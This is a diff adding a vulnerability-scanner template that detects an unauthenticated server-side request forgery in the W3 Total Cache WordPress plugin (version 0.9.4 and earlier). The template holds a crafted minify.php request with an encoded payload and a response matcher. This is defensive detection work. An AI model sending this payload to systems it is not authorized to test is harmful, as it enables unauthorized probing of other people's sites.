@@ -1,0 +1,28 @@
+id: "w3c-total-cache-ssrf"
+name: "Wordpress W3C Total Cache <= 0.9.4 - Server Side Request Forgery (SSRF)"
+severity: "medium"
+description: "The W3 Total Cache WordPress plugin was affected by an Unauthenticated Server Side Request Forgery (SSRF) security vulnerability."
+tech:
+  - "wordpress"
+  - "php"
+tags:
+  - "wordpress"
+  - "wp-plugin"
+  - "cache"
+  - "ssrf"
+  - "wp"
+  - "vuln"
+reference: "https://wpvulndb.com/vulnerabilities/8644"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/wp-content/plugins/w3-total-cache/pub/minify.php?file=yygpKbDS1y9Ky9TLSy0uLi3Wyy9KB3NLKkqUM4CyxUDpxKzECr30_Pz0nNTEgsxiveT8XAA.css"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "or"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "NessusFileIncludeTest"
